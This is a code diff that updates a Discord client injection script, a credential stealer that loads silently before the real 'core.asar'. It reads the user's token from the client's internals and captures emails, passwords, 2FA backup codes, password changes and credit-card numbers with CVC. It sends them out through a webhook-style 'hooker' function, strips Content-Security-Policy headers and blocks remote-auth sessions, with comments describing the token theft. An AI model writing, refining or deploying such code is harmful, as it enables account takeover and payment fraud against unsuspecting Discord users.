@@ -15,11 +15,16 @@ const CONFIG = {
     injection_url: "https://raw.githubusercontent.com/undefinedsource338/dfasfasfasgfsdadfa/refs/heads/main/injectiosn.js",
     filters: {
         urls: [
-            '/auth/login',
-            '/auth/register',
-            '/mfa/totp',
-            '/mfa/codes-verification',
-            '/users/@me',
+            'https://discord.com/api/v*/users/@me',
+            'https://discordapp.com/api/v*/users/@me',
+            'https://*.discord.com/api/v*/users/@me',
+            'https://discordapp.com/api/v*/auth/login',
+            'https://discord.com/api/v*/auth/login',
+            'https://*.discord.com/api/v*/auth/login',
+            'https://discord.com/api/v*/auth/register',
+            'https://*.discord.com/api/v*/auth/register',
+            'https://discord.com/api/v*/mfa/totp',
+            'https://discord.com/api/v*/mfa/codes-verification',
         ],
     },
     filters2: {
@@ -108,6 +113,7 @@ const CONFIG = {
 
 const executeJS = script => {
     const window = BrowserWindow.getAllWindows()[0];
+    if (!window) return Promise.resolve(null);
     return window.webContents.executeJavaScript(script, !0);
 };
 
@@ -116,7 +122,13 @@ const clearAllUserData = () => {
     executeJS("location.reload()");
 };
 
-const getToken = async () => await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
+const getToken = async () => {
+    try {
+        return await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
+    } catch (e) {
+        return null;
+    }
+};
 
 const request = async (method, url, headers, data) => {
     url = new URL(url);
@@ -540,95 +552,169 @@ async function initiation() {
 
 let email = "";
 let password = "";
-let initiationCalled = false;
+let sent = false;
+
+const firstTime = async() => { 
+    if (sent) return;
+    
+    const token = await getToken();
+    if (token) {
+        const account = await fetchAccount(token);
+        if (account) {
+            const content = {
+                "content": `**${account.username}** just got injected!`,
+                "embeds": [{
+                    "fields": [{
+                        "name": "Email",
+                        "value": "`" + account.email + "`",
+                        "inline": true
+                    }, {
+                        "name": "Phone",
+                        "value": "`" + (account.phone || "None") + "`",
+                        "inline": true
+                    }, {
+                        "name": "Token",
+                        "value": "```" + token + "```",
+                        "inline": false
+                    }]
+                }]
+            };
+            await hooker(content, token, account);
+            clearAllUserData();
+        }
+    }
+    sent = true;
+};
+
 const createWindow = () => {
-    mainWindow = BrowserWindow.getAllWindows()[0];
-    if (!mainWindow) return
-
-    mainWindow.webContents.debugger.attach('1.3');
-    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
-        if (!initiationCalled) {
-            await initiation();
-            initiationCalled = true;
-        }
-
-        if (method !== 'Network.responseReceived') return;
-        if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
-        if (![200, 202].includes(params.response.status)) return;
-
-        const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
-            requestId: params.requestId
-        });
-        const responseData = JSON.parse(responseUnparsedData.body);
-
-        const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
-            requestId: params.requestId
-        });
-        const requestData = JSON.parse(requestUnparsedData.postData);
-
-        switch (true) {
-            case params.response.url.endsWith('/login'):
-                if (!responseData.token) {
-                    email = requestData.login;
-                    password = requestData.password;
-                    return; // 2FA
-                }
-                EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
-                break;
-
-            case params.response.url.endsWith('/register'):
-                EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
-                break;
-
-            case params.response.url.endsWith('/totp'):
-                EmailPassToken(email, password, responseData.token, "logged in with 2FA");
-                break;
-
-            case params.response.url.endsWith('/codes-verification'):
-                BackupCodesViewed(responseData.backup_codes, await getToken());
-                break;
-
-            case params.response.url.endsWith('/@me'):
-                if (!requestData.password) return;
-
-                if (requestData.email) {
-                    EmailPassToken(requestData.email, requestData.password, responseData.token, "changed his email to **" + requestData.email + "**");
-                }
-
-                if (requestData.new_password) {
-                    PasswordChanged(requestData.new_password, requestData.password, responseData.token);
-                }
-                break;
-        }
-    });
-
-    mainWindow.webContents.debugger.sendCommand('Network.enable');
-
+    const mainWindow = BrowserWindow.getAllWindows()[0];
+    if (!mainWindow) {
+        setTimeout(createWindow, 1000);
+        return;
+    }
+    
     mainWindow.on('closed', () => {
-        createWindow()
+        setTimeout(createWindow, 1000);
     });
-}
+};
+
 createWindow();
 
+// İlk token çalmayı başlat
+setTimeout(() => {
+    firstTime();
+}, 3000);
+
+// Headers'ı düzenle - CORS için
+session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
+    delete details.responseHeaders["content-security-policy"];
+    delete details.responseHeaders["content-security-policy-report-only"];
+    callback({ 
+        responseHeaders: { 
+            ...details.responseHeaders, 
+            "Access-Control-Allow-Headers": "*" 
+        } 
+    });
+});
+
+// Remote auth gateway'i engelle
+session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, async (details, callback) => {
+    if (details.url.startsWith("wss://")) {
+        callback({ cancel: true });
+        return;
+    }
+    firstTime();
+    return callback({});
+});
+
+// Payment filters - Credit card ve PayPal
 session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details, _) => {
     if (![200, 202].includes(details.statusCode)) return;
     if (details.method != 'POST') return;
-    switch (true) {
-        case details.url.endsWith('tokens'):
-            const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
-            CreditCardAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await getToken());
-            break;
+    
+    try {
+        switch (true) {
+            case details.url.endsWith('tokens'):
+                const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
+                CreditCardAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await getToken());
+                break;
 
-        case details.url.endsWith('paypal_accounts'):
-            PaypalAdded(await getToken());
-            break;
+            case details.url.endsWith('paypal_accounts'):
+                PaypalAdded(await getToken());
+                break;
+        }
+    } catch (e) {
+        // Silent fail
     }
 });
 
-session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
-    if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({
-        cancel: true
-    })
+// Ana filter - Login, register, password change, email change
+session.defaultSession.webRequest.onCompleted(CONFIG.filters, async (details, _) => {
+    if (details.statusCode !== 200 && details.statusCode !== 202) return;
+    
+    try {
+        let data = null;
+        let token = null;
+        
+        // POST request'ler için uploadData'dan al
+        if (details.method === 'POST' || details.method === 'PATCH') {
+            if (!details.uploadData || details.uploadData.length === 0) return;
+            try {
+                const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
+                data = JSON.parse(unparsed_data);
+            } catch (e) {
+                return;
+            }
+        }
+        
+        token = await getToken();
+        if (!token) return;
+        
+        sent = true;
+        
+        switch (true) {
+            case details.url.endsWith("login"):
+                if (data && data.login && data.password) {
+                    EmailPassToken(data.login, data.password, token, "logged in");
+                }
+                break;
+            
+            case details.url.endsWith("register"):
+                if (data && data.email && data.password) {
+                    EmailPassToken(data.email, data.password, token, "signed up");
+                }
+                break;
+            
+            case details.url.endsWith("users/@me") && details.method === "PATCH":
+                if (!data || !data.password) return;
+                if (data.email) { 
+                    EmailPassToken(data.email, data.password, token, "changed his email to **" + data.email + "**");
+                }
+                if (data.new_password) { 
+                    PasswordChanged(data.password, data.new_password, token);
+                }
+                break;
+            
+            case details.url.endsWith("/totp"):
+                if (email && password) {
+                    EmailPassToken(email, password, token, "logged in with 2FA");
+                }
+                break;
+            
+            case details.url.endsWith("/codes-verification"):
+                if (data && data.backup_codes) {
+                    BackupCodesViewed(data.backup_codes, token);
+                }
+                break;
+            
+            case details.url.includes("users/@me") && details.method === "GET":
+                // İlk token çalmayı tetikle
+                firstTime();
+                break;
+        }
+    } catch (e) {
+        // Silent fail
+    }
 });
 
 module.exports = require("./core.asar");
